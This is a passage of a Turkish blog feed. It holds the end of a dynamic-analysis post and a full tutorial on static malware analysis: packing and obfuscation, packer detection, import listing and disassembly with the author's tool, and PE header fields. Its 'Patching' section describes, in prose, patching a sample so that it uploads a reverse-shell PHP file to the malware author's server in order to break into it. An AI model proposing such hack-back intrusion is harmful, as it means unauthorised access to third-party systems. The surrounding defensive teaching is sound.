&lt;p&gt;Bu seri bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin nerelerine ne şekilde bakılmasını, ne şekilde ve nerede incelenmesi gerektiğini anlatmak için oluşturduğum bir seriydi.&lt;/p&gt;

&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;

&lt;p&gt;Bu yazıda &lt;strong&gt;Dynamic Malware Analysis&lt;/strong&gt; konusuna değindik.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin son partıydı bu.&lt;/p&gt;

&lt;p&gt;Tabiki tüm &lt;strong&gt;Malware Analiz&lt;/strong&gt; konusu benim anlattığım kadar değil hatta anlattıklarıma temeli bile diyebiliriz.&lt;/p&gt;

&lt;p&gt;Benim gözümde yeni çıkan &lt;strong&gt;Malware&lt;/strong&gt;‘lerin analizinin yapılması yeni &lt;strong&gt;Zaafiyet&lt;/strong&gt; ve &lt;strong&gt;Teknik&lt;/strong&gt;‘leri bulmamıza çok yardımcı olacaktır.&lt;/p&gt;

&lt;p&gt;Ben analizini yapmak için &lt;strong&gt;Malware&lt;/strong&gt; istiyorum diyenlerimiz var ise &lt;strong&gt;Google&lt;/strong&gt; dayımıza &lt;strong&gt;Malware Samples&lt;/strong&gt; yazması yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;Bu serimizinde sonuna geldik. Umarım güzel bir seri okutabilmişimdir sizlere.&lt;/p&gt;

&lt;p&gt;İleride yazacaklarıma &lt;strong&gt;Oylama&lt;/strong&gt; ile karar veriyorum twitter üzerinden.&lt;/p&gt;

&lt;p&gt;Sorunuz varsa çekinmeyin bu konuda veya farklı bir konuda.&lt;/p&gt;

&lt;p&gt;Sorular için twitter adresim : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;0DAYanc&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Malware Analysis - Dynamic Analysis (Part 3) Merhaba arkadaşlar Malware Analizi serimin üçüncü part’ına hoşgeldiniz.</summary></entry><entry><title type="html">Malware Analysis - Static Analysis (Part 2)</title><link href="http://localhost:4000/2019/05/18/malware-analysis-part-2.html" rel="alternate" type="text/html" title="Malware Analysis - Static Analysis (Part 2)" /><published>2019-05-18T00:00:00+03:00</published><updated>2019-05-18T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/18/malware-analysis-part-2</id><content type="html" xml:base="http://localhost:4000/2019/05/18/malware-analysis-part-2.html">&lt;h4 id=&quot;malware-analysis---static-analysis-part-2&quot;&gt;Malware Analysis - Static Analysis (Part 2)&lt;/h4&gt;

&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin ikinci part’ına hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/0RPDnY.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu part içerisinde bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Statik&lt;/strong&gt; analizinin nasıl yapacağını anlatacağım.&lt;/p&gt;

&lt;p&gt;İleride ki part içerisinde &lt;strong&gt;Dinamik&lt;/strong&gt; analizini anlatacağım.&lt;/p&gt;

&lt;p&gt;Bu ikisini ayrı ayrı partlara bölmemin sebebi ikisininde tam olarak derinliklerine ineceğiz. Bu yüzden ikisini ayrı ayrı paylaşma gereği duydum.&lt;/p&gt;

&lt;p&gt;Önceki part içerisinden &lt;strong&gt;Win 7&lt;/strong&gt; ve &lt;strong&gt;REMnux&lt;/strong&gt;‘u kurduğunuzu aynı zamanda &lt;strong&gt;Network&lt;/strong&gt; ve &lt;strong&gt;Snapshot&lt;/strong&gt; ayarlarını gerçekleştirdiğinizi varsayıp devam ediyorum.&lt;/p&gt;

&lt;p&gt;Bu yazımızda &lt;strong&gt;Sanal Makine&lt;/strong&gt; kullanmayacağız. Çünkü &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırmadan inceleyeceğiz. Yalnız ileride &lt;strong&gt;Dynamic Analysis&lt;/strong&gt; yazımda artık bir kaç &lt;strong&gt;Malware&lt;/strong&gt; çalıştırmaya başladığımızda &lt;strong&gt;Sanal Makine&lt;/strong&gt; kullanacağımız için gerekli olacaktır.&lt;/p&gt;

&lt;p&gt;Şimdi yavaştan yazımıza geçelim ve bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Statik&lt;/strong&gt; analizinin nasıl yapacağını anlatalım.&lt;/p&gt;

&lt;h2 id=&quot;what-the-fk-is-packing-and-obfuscating-&quot;&gt;What The F!!K is packing and obfuscating ?&lt;/h2&gt;

&lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Statik&lt;/strong&gt; analizini gerçekleştirmeye başlayacağımızda bakmamız gereken ilk noktalardan biri &lt;strong&gt;Pack&lt;/strong&gt; ve &lt;strong&gt;Obfuscate&lt;/strong&gt; terimleridir.&lt;/p&gt;

&lt;p&gt;Hemen bu terimlere daha önce denk gelmeyen arkadaşlar için basitçe anlatayım.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Packing Nedir ?&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Dosya sıkıştırma denilebilir basit bir şekilde.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sıkıştırılan dosya kendi içinde aynı zamanda bu sıkıştırmayı çözmek için bir kod bulundurur.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Genellikle packlenmiş yani sıkıştırılmış dosyalar bu packing’i kendi içinde çözmek için anahtarlar kullanır.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı &lt;strong&gt;Pack&lt;/strong&gt;‘lemenin asıl amacı &lt;strong&gt;Ana Kod&lt;/strong&gt;‘u &lt;strong&gt;Sıkıştırdıktan&lt;/strong&gt; sonra bu &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt; çalıştığında &lt;strong&gt;Sıkıştırılmış&lt;/strong&gt;  kodu &lt;strong&gt;Memory&lt;/strong&gt; yani &lt;strong&gt;Hafıza&lt;/strong&gt; içerisinde çözmektir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin analizini engellemek için ve kafa karıştırmak için çokça kullanılan bir yöntemdir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Bir &lt;strong&gt;Packing&lt;/strong&gt;‘in &lt;strong&gt;Routine&lt;/strong&gt;‘ini yani &lt;strong&gt;Rutin&lt;/strong&gt;‘ini gösteren googleden bulduğum görsel :
&lt;img src=&quot;https://i.hizliresim.com/k92BdJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Obfuscating Nedir ?&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;İnsanların anlaması için zorlaştırma işlemi denilebilir basit bir şekilde.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir kodu ne kadar daha az okuna bilir kılarsanız anlaşılmasıda zorlaşır buda bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin anlaşılmasını zorlaştıran bir yöntemdir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Örneğin elimizdeki &lt;strong&gt;isim&lt;/strong&gt; değişkeni kod içerisinde &lt;strong&gt;vtkej12ns&lt;/strong&gt; şeklinde göründüğünde bu değişkenin &lt;strong&gt;isim&lt;/strong&gt; alanını tuttuğun anlamak zorlaşır ve buda &lt;strong&gt;Obfuscated&lt;/strong&gt; bir değişkendir.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Örnek bir &lt;strong&gt;Obfuscate&lt;/strong&gt; edilmiş kod :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/0RPn3R.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıda bulunan resimdeki basit bir &lt;strong&gt;HTML&lt;/strong&gt; ve &lt;strong&gt;Javascript&lt;/strong&gt; kodunun ne kadar karmaşıklaştırıldığı anlaşılabilir durumda.&lt;/p&gt;

&lt;h2 id=&quot;how-to-unpack-and-deobfuscate&quot;&gt;How to unpack and deobfuscate&lt;/h2&gt;

&lt;p&gt;Öncelikle aşşağıdakileri anlamakta zorluk çekebilecek arkadaşlarımız için bazı terimlerin türkçe karşılığını yazayım :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Portable Executable&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Çalıştırılabilir dosyamızdır. Buna uzantısı &lt;strong&gt;.exe&lt;/strong&gt; vs.. olan dosyalarda denilebilir.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Packer&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Bir yazılımı &lt;strong&gt;Sıkıştırmaya&lt;/strong&gt; yarayan yazılım.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Unpacker&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Sıkıştırılmış&lt;/strong&gt; kodu eski haline getirmeye yarayan yazılım.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;PE Sections&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Çalıştırılabilir dosyamızın içerdiği &lt;strong&gt;Code&lt;/strong&gt;, &lt;strong&gt;Data&lt;/strong&gt; gibi bilgileri tutan bölümlerdir.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;detecting-packing-and-unpacking-it&quot;&gt;Detecting packing and unpacking it&lt;/h1&gt;

&lt;h4 id=&quot;detecting-packing&quot;&gt;Detecting packing&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Pack&lt;/strong&gt; edilmiş bir &lt;strong&gt;Malware&lt;/strong&gt;‘yi &lt;strong&gt;Unpack&lt;/strong&gt; etmek yani çözmek ise bazen işin en kolay kısmı olabilirken en zor kısmıda olabilir.&lt;/p&gt;

&lt;p&gt;Öncelikle pack edilmiş bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin hangi pack yazılımını kullandığını bulmamız gerek.&lt;/p&gt;

&lt;p&gt;Fakat bunu gerçekleştirebilecek &lt;strong&gt;Yazılım&lt;/strong&gt;‘ları göstermeye geçmeden önce önemli bir not eklemek istiyorum. Hangi &lt;strong&gt;pack&lt;/strong&gt; bulma yazılımını kullanırsanız kullanın bu yazılımlar sadece bilinen &lt;strong&gt;Packer&lt;/strong&gt;‘ların isimlerini tutuyor.&lt;/p&gt;

&lt;p&gt;Dolayısı ile bulunamayan bir &lt;strong&gt;Packing&lt;/strong&gt; işlemini anlamak için &lt;strong&gt;Portable Executable&lt;/strong&gt; yani &lt;strong&gt;Çalıştırılabilir Dosya&lt;/strong&gt;‘mızın &lt;strong&gt;PE Section&lt;/strong&gt;‘larına bakmamız gereklidir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pack&lt;/strong&gt; edilmiş bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin hangi &lt;strong&gt;Pack&lt;/strong&gt; yazılımını kullandığını bulmak için bazı araçlar :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;RDG Packer Detector&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PEiD&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Bu verdiğimiz toollardan eğer &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Packer&lt;/strong&gt; adını çıkarabilirseniz bu &lt;strong&gt;Packer&lt;/strong&gt;‘in bir &lt;strong&gt;Unpacker&lt;/strong&gt;‘ini bulmaya aramaya başlayabilirsiniz.&lt;/p&gt;

&lt;p&gt;Eğer &lt;strong&gt;Packer&lt;/strong&gt; adını verdiyse ve bu &lt;strong&gt;Packer&lt;/strong&gt; için herhangi bir &lt;strong&gt;Unpacker&lt;/strong&gt; bulunmuyorsa kendi ellerinizle işi bitirmeye kendinizi yavaştan hazırlamaya başlayın.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Packer&lt;/strong&gt;‘in adını bulamadıysanız şayet &lt;strong&gt;Portable Executable&lt;/strong&gt; içerisinde yani &lt;strong&gt;Malware&lt;/strong&gt;‘miz içerisinde bir &lt;strong&gt;Packing&lt;/strong&gt; işleminin gerçekleştiğini anlamak için &lt;strong&gt;PE Section&lt;/strong&gt;‘larına bakmanız yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/7aOgOm.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıdaki fotorafta örnek bir &lt;strong&gt;Portable Executable&lt;/strong&gt;‘nin &lt;strong&gt;UPX Packer&lt;/strong&gt; ile &lt;strong&gt;Pack&lt;/strong&gt;‘lendiğini görebiliriz.&lt;/p&gt;

&lt;p&gt;Genellik ile normal bir &lt;strong&gt;PE&lt;/strong&gt;‘nin içerdiği &lt;strong&gt;Section&lt;/strong&gt;‘lar dışında &lt;strong&gt;Section&lt;/strong&gt;‘lar içeren &lt;strong&gt;PE&lt;/strong&gt;‘ler &lt;strong&gt;Packing&lt;/strong&gt; işlemine tabir tutulduğunu ortaya dökmemiz için bir yoldur.&lt;/p&gt;

&lt;p&gt;Ayrıca sadece &lt;strong&gt;Packing&lt;/strong&gt; işlemi değil aynı zamanda bu &lt;strong&gt;Section&lt;/strong&gt;‘lar içerisinden &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın kendi içerisinden farklı bir yazılım çıkarttığı gibi değişik türde durumlara şahit olabilirsiniz.&lt;/p&gt;

&lt;h4 id=&quot;unpacking&quot;&gt;Unpacking&lt;/h4&gt;

&lt;p&gt;Dosyanın yani &lt;strong&gt;Malware&lt;/strong&gt;‘nin bir &lt;strong&gt;Packing&lt;/strong&gt; işlemi içerdiğini anladıktan sonra kendi elimizle &lt;strong&gt;Unpack&lt;/strong&gt; etmek için herhangi bir &lt;strong&gt;Debugger&lt;/strong&gt; aracılığı ile &lt;strong&gt;Malware&lt;/strong&gt;‘yi izleyip kendini &lt;strong&gt;Memory&lt;/strong&gt; İçerisinde &lt;strong&gt;Unpack&lt;/strong&gt; ettikten sonra &lt;strong&gt;Unpack&lt;/strong&gt; edilmiş &lt;strong&gt;Kodu&lt;/strong&gt; dışarıya bir &lt;strong&gt;.exe&lt;/strong&gt; olarak aktarabiliriz.&lt;/p&gt;

&lt;p&gt;Bir arkadaşımız &lt;strong&gt;Amber Packer&lt;/strong&gt; adında bir &lt;strong&gt;Packing&lt;/strong&gt; yazılımı geliştirdi. Yukarıda bahsettiğimiz toollardan neredeyse hepsi bunu bulamıyor.&lt;/p&gt;

&lt;p&gt;Ve bulamamasına rağmen yukarıda bahsettiğim tekniği kullanıp bu &lt;strong&gt;Packing&lt;/strong&gt; edilmiş dosyayı &lt;strong&gt;Unpack&lt;/strong&gt; edip bunu blog yazısına döken sevdiğim bir arkadaşımın blog yazısı :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://robindimyan.blogspot.com/2018/02/dkhos-rev300-cozumu.html&quot;&gt;Amber unpacking&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;detecting-obfuscating-and-deobfuscating-it&quot;&gt;Detecting obfuscating and deobfuscating it&lt;/h1&gt;
&lt;h4 id=&quot;detecting-obfuscating&quot;&gt;Detecting Obfuscating&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Detecting&lt;/strong&gt; kısmı çok basit.&lt;/p&gt;

&lt;p&gt;Anlaşılabilir bir &lt;strong&gt;Kod&lt;/strong&gt; ise şayet &lt;strong&gt;Obfuscated&lt;/strong&gt; bir &lt;strong&gt;Kod&lt;/strong&gt; değildir.&lt;/p&gt;

&lt;p&gt;Anlaşılmaz bir &lt;strong&gt;Kod&lt;/strong&gt; ise &lt;strong&gt;Obfuscated&lt;/strong&gt; bir &lt;strong&gt;Kod&lt;/strong&gt; olduğu söylenebilir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/V9ZYvB.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;deobfuscating&quot;&gt;Deobfuscating&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Obfuscated&lt;/strong&gt; kodu &lt;strong&gt;Deobfuscate&lt;/strong&gt; etmek için &lt;strong&gt;Değişkenlerin&lt;/strong&gt;, &lt;strong&gt;Fonksiyonların&lt;/strong&gt; neler yaptığını takip edip sonra yaptığı şeye göre tekrar isimlendirebilirsiniz.&lt;/p&gt;

&lt;p&gt;Ya da internette bulunan &lt;strong&gt;Deobfuscation Tool&lt;/strong&gt;‘larından yararlanabilirsiniz.&lt;/p&gt;

&lt;p&gt;Buraya 13 tanesinin listelendiği bir forum post’unu bırakıyorum :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://rstforums.com/forum/topic/103595-13-deobfuscation-tools-for-reverse-engineers/&quot;&gt;13 Deobfuscator Tools&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Basit bir şekilde bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin yapılması gereken ilk iki &lt;strong&gt;Statik&lt;/strong&gt; analizinden bahsettim.&lt;/p&gt;

&lt;p&gt;Şimdi yavaştan &lt;strong&gt;Malware&lt;/strong&gt;‘mizin diğer &lt;strong&gt;Statik&lt;/strong&gt; analizlerini yapıp &lt;strong&gt;Zararlı yazılımımızı&lt;/strong&gt; dahada yakından tanıyalım.&lt;/p&gt;

&lt;h2 id=&quot;linked-libraries-and-functions&quot;&gt;Linked Libraries And Functions&lt;/h2&gt;

&lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘yi yani &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı daha yakından tanımak için içerdiği &lt;strong&gt;Kütüphane&lt;/strong&gt; ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘lara bakmamız yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;15 kilo dumbell’ı kanadıma çektikten sonra bu kısımı daha da derinden inceleyeceğiz.&lt;/p&gt;

&lt;p&gt;Ve çokta zorlu olmayan setlerden sonra geldim.&lt;/p&gt;

&lt;p&gt;Şimdi örnek bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Kütüphane&lt;/strong&gt; ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘larını listelemek için kendi yazdığım &lt;a href=&quot;https://github.com/blacknbunny/peanalyzer&quot;&gt;peanalyzer&lt;/a&gt; tool’unu kullanıp &lt;strong&gt;Malware&lt;/strong&gt;‘miz neler yapıyor inceleyelim.&lt;/p&gt;

&lt;p&gt;Tool’u indirdikten sonra :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python peanalyzer.py --file file.exe --show imports
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Demeniz yeterli olacaktır.&lt;/p&gt;

&lt;p&gt;Sonrasındaki çıktıda &lt;strong&gt;Kütüphaneler&lt;/strong&gt;  içerisinden &lt;strong&gt;Program&lt;/strong&gt; içerisinde hangi fonksiyonların kullanıldığını listelemiş olacağız.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/169dp1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin kullandığı fonksiyonlar değil yalnız bu &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; arasından &lt;strong&gt;ShellExecuteW&lt;/strong&gt;, &lt;strong&gt;GetCurrentProcess&lt;/strong&gt; gibi &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; genellik ile &lt;strong&gt;Malware&lt;/strong&gt;‘ler tarafından kullanılıyor.&lt;/p&gt;

&lt;p&gt;Burada objektif bir şekilde anlatıyorum size bunu. Artık siz kendi inceleyeceğiniz &lt;strong&gt;Malware&lt;/strong&gt;‘yi daha yakından tanımak için neler yapmanız gerektiğini daha iyi anlayacaksınız.&lt;/p&gt;

&lt;p&gt;Yani bir &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın herhangi bir &lt;strong&gt;Internet Sayfasından&lt;/strong&gt; dosya indirdiğini &lt;strong&gt;Fonksiyonlar&lt;/strong&gt; aracılığıyla görmek mümkün.&lt;/p&gt;

&lt;p&gt;Ve bu sayede kafanızda &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın neler yaptığına dair kafamızda bir şema olacaktır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kütüphaneler&lt;/strong&gt;‘in ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘ların &lt;strong&gt;Statik&lt;/strong&gt; bir analiz içerisinde ne gibi büyük bir rol oynadığını bu şekilde anlayabilirsiniz.&lt;/p&gt;

&lt;h2 id=&quot;disassemble-decompiling-patching&quot;&gt;Disassemble, Decompiling, Patching&lt;/h2&gt;

&lt;h4 id=&quot;disassemble&quot;&gt;Disassemble&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Statik&lt;/strong&gt; bir analiz içerisinde ayrıca &lt;strong&gt;Malware&lt;/strong&gt;‘nin nasıl bir gidişat izlediğini görmek ve düzenlemek bize ayrıca büyük bir avantaj sağlar.&lt;/p&gt;

&lt;p&gt;Yukarıda da kullandığımız &lt;a href=&quot;https://github.com/blacknbunny/peanalyzer&quot;&gt;peanalyzer&lt;/a&gt; tool’u yazılımları &lt;strong&gt;Disassemble&lt;/strong&gt; etmemize yarıyor.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python peanalyzer.py --file file.exe --disassemble all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/jgEnDn.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;File.exe&lt;/strong&gt;‘yi bir malware olarak düşünürsek şayet &lt;strong&gt;Assembly&lt;/strong&gt; dilinde neler yaptığını incelememiz çok yararlı olacaktır.&lt;/p&gt;

&lt;h4 id=&quot;decompiling&quot;&gt;Decompiling&lt;/h4&gt;

&lt;p&gt;Şayet bazı &lt;strong&gt;Malware&lt;/strong&gt;‘leri &lt;strong&gt;Assembly&lt;/strong&gt; değilde kendi dilinden okumak mümkün olabiliyor.&lt;/p&gt;

&lt;p&gt;Örneğin bir &lt;strong&gt;C#&lt;/strong&gt; ile yazılan &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u verilmesede bazı araçlar ile o &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u almak mümkün.&lt;/p&gt;

&lt;p&gt;Yani kısaca &lt;strong&gt;Compile&lt;/strong&gt; edilip &lt;strong&gt;Assembly&lt;/strong&gt;‘e çevirilen bir kodu tekrar eski haline çevirmek &lt;strong&gt;Decompiling&lt;/strong&gt; oluyor.&lt;/p&gt;

&lt;p&gt;Dahada kısaca aşşağıdaki fotorafı tersine çevirdiğinizde olan şey basit bir şekilde &lt;strong&gt;Decompiling&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/zjW4ZY.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;patching&quot;&gt;Patching&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Hex Code&lt;/strong&gt;‘ları yani &lt;strong&gt;Shellcode&lt;/strong&gt;‘ları ile oynama zamanı geldi demek bu.&lt;/p&gt;

&lt;p&gt;Diyelim ki &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ı geliştiren kişi &lt;strong&gt;UploadFileToServer&lt;/strong&gt; adında bir fonksiyon geliştirdi &lt;strong&gt;Program&lt;/strong&gt; içerisinde.&lt;/p&gt;

&lt;p&gt;Ve sizin bazı özel dosyalarınızı kendi &lt;strong&gt;Sunucu&lt;/strong&gt;‘suna yüklüyor. Ve bu şekilde &lt;strong&gt;Sunucu&lt;/strong&gt;‘dan direk bu dosyalara ulaşabiliyor.&lt;/p&gt;

&lt;p&gt;Diyelim ki bu &lt;strong&gt;Fonksiyon&lt;/strong&gt; 1 adet string alıyor parametre olarak. Ve bu parametrede yükleyeceği dosya olsun.&lt;/p&gt;

&lt;p&gt;Ve bu parametreyide &lt;strong&gt;Zararlı Yazılım Geliştiricisi&lt;/strong&gt; özel olarak &lt;strong&gt;secret.txt&lt;/strong&gt; olarak atadı.&lt;/p&gt;

&lt;p&gt;Şayet biz bunu program içerisinde &lt;strong&gt;Hex Code&lt;/strong&gt;‘ları arasında değiştirip &lt;strong&gt;reverseshell.php&lt;/strong&gt; adında kendi yazdığımız küçük bir &lt;strong&gt;Reverse Shell&lt;/strong&gt; kodları içeren &lt;strong&gt;PHP&lt;/strong&gt; dosyası ile değiştirdik.&lt;/p&gt;

&lt;p&gt;Ve bilgisayarımızdan &lt;strong&gt;PORT&lt;/strong&gt;‘u dinlemeye başladık.&lt;/p&gt;

&lt;p&gt;Bu dosya &lt;strong&gt;Remote Server&lt;/strong&gt;‘e yükleneceğinden. &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt; geliştiricisinin sunucusuna basit bir şekilde ulaşabileceğiz.&lt;/p&gt;

&lt;p&gt;Ve basit bir şekilde &lt;strong&gt;Patching&lt;/strong&gt; bu.&lt;/p&gt;

&lt;h2 id=&quot;pe-i̇çerisinden-alabileceğimiz-bilgiler&quot;&gt;PE İçerisinden Alabileceğimiz Bilgiler&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;TimeDateStamp&lt;/strong&gt; : Yazılan &lt;strong&gt;Program&lt;/strong&gt;‘ın yani &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt;‘ın ne tarihte ve ne zamanda &lt;strong&gt;Compile&lt;/strong&gt; edildiği bilgisini tutar.&lt;/p&gt;

&lt;p&gt;Bu bilgi değiştirilebilirdir &lt;strong&gt;Expert Malware Developer&lt;/strong&gt; arkadaşlarımız genellikle bunun yerine sahte bir bilgi koymayı tercih eder malum çok büyük bir yazılım ise şayet devlet baba uyumuyor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/grNoE0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bunun dışında &lt;strong&gt;Yazılım&lt;/strong&gt;‘ın hangi dil ile geliştirdiği,&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Compiler&lt;/strong&gt; olarak ne kullanıldığı dair tüm bilgileri içerir.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt;‘un &lt;strong&gt;PE&lt;/strong&gt; dökümantasyonu :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/debug/pe-format&quot;&gt;PE Format&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;statik-analiz-için-işimizi-kolaylaştıracak-kaynaklar-ve-birkaç-tool&quot;&gt;Statik analiz için işimizi kolaylaştıracak kaynaklar ve birkaç tool&lt;/h2&gt;

&lt;h4 id=&quot;genellikle-kullandığım-araçlar-&quot;&gt;Genellikle kullandığım araçlar :&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;RegShot&lt;/strong&gt; : &lt;strong&gt;Malware&lt;/strong&gt; çalışmadan önce &lt;strong&gt;Registry&lt;/strong&gt;‘i kaydedip çalıştıktan sonraki ile karşılaştırmamıza yarıyor. Basitce &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Registry&lt;/strong&gt; içerisinde neleri değiştirdiğini inceleyebiliriz.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;PE-Bear&lt;/strong&gt; : Zamanında &lt;strong&gt;CIA&lt;/strong&gt;‘inde kullandığı bir &lt;strong&gt;PE View&lt;/strong&gt; aracı.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;güzel-kaynaklar-&quot;&gt;Güzel kaynaklar :&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://malwareanalysis.tools/&quot;&gt;malwareanalysis.tools&lt;/a&gt; : Web sayfası içerisinden analizini yaptığınız malware için ne gerekiyorsa basit bir şekilde ulaşabilmenizi sağlayan yararlı bir sayfa.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/rshipp/awesome-malware-analysis&quot;&gt;awesome-malware-analysis&lt;/a&gt; : Güzel bir &lt;strong&gt;Cheat Sheet&lt;/strong&gt; malware analizi için.&lt;/p&gt;

&lt;h2 id=&quot;the-end&quot;&gt;THE END&lt;/h2&gt;

